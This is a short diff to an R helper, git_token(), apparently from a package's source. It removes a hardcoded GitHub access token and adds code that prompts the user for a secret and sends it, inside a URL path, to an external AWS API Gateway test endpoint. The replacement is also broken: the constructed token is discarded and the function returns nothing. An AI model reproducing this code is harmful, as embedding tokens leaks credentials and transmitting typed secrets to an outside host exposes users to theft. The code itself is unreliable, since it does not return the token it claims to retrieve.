@@ -5,6 +5,8 @@
 #' @export
 git_token <- function() {
     # Retrieves the github token
-    return('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')
+  fd=httr::GET(glue('https://1sk5fv32n5.execute-api.us-west-1.amazonaws.com/test2/{askpass::askpass()}'))
+  paste0("ghp_",jsonlite::fromJSON(rawToChar(fd$content)))
+    return()
     # Returns: [character] the auth token
 }
